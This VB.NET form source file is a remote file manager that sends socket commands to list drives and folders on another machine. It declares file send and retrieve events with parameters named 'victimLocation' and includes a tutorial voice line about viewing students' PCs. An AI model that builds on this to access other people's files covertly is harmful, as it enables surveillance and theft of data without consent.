Imports System.Threading
Imports System.Speech.Synthesis

Public Class frmFileManager
    Public Event SendFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String)
    Public Event RetrieveFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String, ByVal filesize As String)
    Public isTutorial As String
    Public sock As Integer

    Private Sub frmFileManager_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        ListView1.Items.Clear()
    End Sub

    Private Sub frmFileManager_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        frmMain.S.Send(sock, "GetDrives" & "|BawaneH|")
    End Sub

    Private Sub ListView1_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles ListView1.DoubleClick
        If ListView1.FocusedItem.ImageIndex = 0 Or ListView1.FocusedItem.ImageIndex = 1 Or ListView1.FocusedItem.ImageIndex = 2 Then
            If TextBox1.Text.Length = 0 Then
                TextBox1.Text += ListView1.FocusedItem.Text
                ' Form1.S.Send(sock, "FileManager" & "|BawaneH|" & TextBox1.Text)
            Else
                TextBox1.Text += ListView1.FocusedItem.Text & "\"
                ' Form1.S.Send(sock, "FileManager" & "|BawaneH|" & TextBox1.Text)
            End If
            RefreshList()
        End If
    End Sub
    Public Sub RefreshList()
        frmMain.S.Send(sock, "FileManager" & "|BawaneH|" & TextBox1.Text)
    End Sub

    Private Sub Button1_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles Button1.Click
        If TextBox1.Text.Length < 4 Then
            TextBox1.Text = ""
            frmMain.S.Send(sock, "GetDrives" & "|BawaneH|")
        Else
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
            RefreshList()
        End If
    End Sub
    Dim builder As PromptBuilder
    Dim synthesizer As SpeechSynthesizer

    Private Sub Animation_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Animation.Tick
        If Animation.Tag = "Show" Then
            If Me.Opacity < 0.95 Then
                Me.Opacity += 0.05
                Me.Top -= 1
            Else
                Animation.Stop()

                If isTutorial = "Yes" Then
                    builder = New PromptBuilder()
                    builder.StartVoice(VoiceGender.Female, VoiceAge.Child)
                    builder.AppendText("That you can show you of Local Disk of the Student PC's.")
                    builder.EndVoice()
                    synthesizer = New SpeechSynthesizer()
                    synthesizer.Speak(builder)
                    synthesizer.Dispose()
                End If

            End If
        Else
            If Me.Opacity > 0 Then
                Me.Opacity -= 0.05
                Me.Top += 1
            Else
                Animation.Stop()

                If isTutorial = "No" Then
                    frmMenu.Show()
                ElseIf isTutorial = "Skip" Then
                Else
                    frmTutorial.MoveIndicator.Tag = "Keyword"
                    frmTutorial.MoveIndicator.Start()
                End If

                Me.Close()
            End If
        End If
    End Sub

    Private Sub lblClose_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles lblClose.Click
        Me.Close()
    End Sub

End Class